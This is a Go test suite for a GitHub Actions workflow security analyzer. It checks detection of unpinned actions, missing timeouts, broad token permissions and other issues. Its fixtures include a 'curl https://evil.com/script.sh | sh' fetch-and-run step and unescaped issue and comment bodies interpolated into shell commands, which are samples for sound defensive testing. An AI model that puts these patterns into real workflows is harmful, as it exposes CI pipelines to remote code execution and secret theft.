package analyzer

import (
	"testing"

	"github.com/EdgarOrtegaRamirez/actionforge/internal/workflow"
)

func TestNewAnalyzer(t *testing.T) {
	a := NewAnalyzer()
	if a == nil {
		t.Fatal("expected non-nil analyzer")
	}
}

func TestAnalyzeEmptyWorkflow(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Empty",
		Jobs: make(map[string]workflow.Job),
	}
	result := a.Analyze(wf)

	if result.Score.Value != 94 {
		t.Errorf("expected score 94, got %d", result.Score.Value)
	}
}

func TestAnalyzeUnpinnedAction(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Uses: "actions/checkout@v4"},
				},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Action not pinned to SHA" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected unpinned action warning")
	}
}

func TestAnalyzeDeprecatedAction(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Uses: "actions/checkout@v2"},
				},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Deprecated action version" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected deprecated action warning")
	}
}

func TestAnalyzeMissingTimeout(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				RunsOn: "ubuntu-latest",
				Steps:  []workflow.Step{{Run: "echo hello"}},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Missing timeout-minutes" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected missing timeout warning")
	}
}

func TestAnalyzeCurlPipeSecurity(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Run: `curl -sL https://evil.com/script.sh | sh`},
				},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Piping curl to shell" || issue.Title == "Piping curl to bash" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected curl pipe security warning")
	}
}

func TestAnalyzeInjectionDetection(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Run: `echo "${{ github.event.issue.body }}" > file`},
				},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Potential injection via issue body" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected injection detection")
	}
}

func TestAnalyzePermissions(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Permissions: map[string]string{"contents": "write"},
				Steps:       []workflow.Step{{Run: "echo hello"}},
			},
		},
	}
	result := a.Analyze(wf)

	found := false
	for _, issue := range result.Issues {
		if issue.Title == "Overly permissive GITHUB_TOKEN" {
			found = true
			break
		}
	}
	if !found {
		t.Error("expected permissive token warning")
	}
}

func TestAnalyzeScoreDeduction(t *testing.T) {
	a := NewAnalyzer()

	// Critical issue: curl pipe to shell
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Run: `curl -sL https://evil.com/script.sh | sh`},
				},
			},
		},
	}
	result := a.Analyze(wf)

	// Critical = -15, plus info/warning from other checks
	if result.Score.Value >= 100 {
		t.Error("expected score to be reduced by critical issues")
	}
}

func TestSeverityString(t *testing.T) {
	tests := []struct {
		s    Severity
		want string
	}{
		{SeverityInfo, "INFO"},
		{SeverityWarning, "WARNING"},
		{SeverityError, "ERROR"},
		{SeverityCritical, "CRITICAL"},
		{Severity(99), "UNKNOWN"},
	}

	for _, tt := range tests {
		got := tt.s.String()
		if got != tt.want {
			t.Errorf("Severity(%d).String() = %q, want %q", tt.s, got, tt.want)
		}
	}
}

func TestHasConcurrency(t *testing.T) {
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"job1": {},
			"job2": {},
		},
	}

	if hasConcurrency(wf) {
		t.Error("expected hasConcurrency to return false (no concurrency config)")
	}
}

func TestFindSimilarJobs(t *testing.T) {
	wf := &workflow.Workflow{
		Name: "Test",
		Jobs: map[string]workflow.Job{
			"build": {
				Steps: []workflow.Step{
					{Run: "echo a"},
					{Run: "echo b"},
					{Run: "echo c"},
					{Run: "echo d"},
				},
			},
			"test": {
				Steps: []workflow.Step{
					{Run: "echo a"},
					{Run: "echo b"},
					{Run: "echo c"},
					{Run: "echo d"},
				},
			},
		},
	}

	pairs := findSimilarJobs(wf)
	if len(pairs) != 1 {
		t.Errorf("expected 1 pair of similar jobs, got %d", len(pairs))
	}
}

func TestScoreBoundary(t *testing.T) {
	a := NewAnalyzer()
	wf := &workflow.Workflow{
		Name: "Terrible",
		Jobs: map[string]workflow.Job{
			"job1": {
				Steps: []workflow.Step{
					{Uses: "actions/checkout@v4"},
					{Run: `curl https://example.com/script.sh | sh`},
					{Run: `echo "${{ github.event.issue.body }}"`},
					{Run: `echo "${{ github.event.comment.body }}"`},
				},
			},
		},
	}

	result := a.Analyze(wf)
	if result.Score.Value < 0 {
		t.Errorf("score should not be negative, got %d", result.Score.Value)
	}
}
